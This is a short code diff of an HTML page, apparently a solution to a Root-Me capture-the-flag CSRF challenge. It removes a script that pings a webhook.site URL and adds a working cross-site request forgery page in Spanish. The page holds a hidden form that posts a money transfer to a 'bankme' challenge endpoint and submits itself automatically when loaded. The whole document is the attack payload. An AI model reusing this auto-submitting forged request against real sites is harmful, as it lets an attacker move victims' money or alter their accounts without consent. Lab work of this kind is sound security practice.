@@ -1,3 +1,18 @@
-<script>
-  fetch("https://webhook.site/513fb535-459c-4965-bb3b-33c8572be46d");
-</script>
+<!DOCTYPE html>
+<html lang="es">
+  <head>
+    <meta charset="UTF-8">
+    <title>CSRF</title>
+  </head>
+  <body>
+    <h1>Bienvenido</h1>
+    <form id="csrfForm" action="https://bankme-1.challenges.pro.root-me.org/profile" method="POST">
+      <input type="hidden" name="recipient" value="the_real_mysk">
+      <input type="hidden" name="amount" value="1">
+    </form>
+    <script>
+      // Enviar automáticamente el formulario al cargar la página
+      document.getElementById('csrfForm').submit();
+    </script>
+  </body>
+</html>
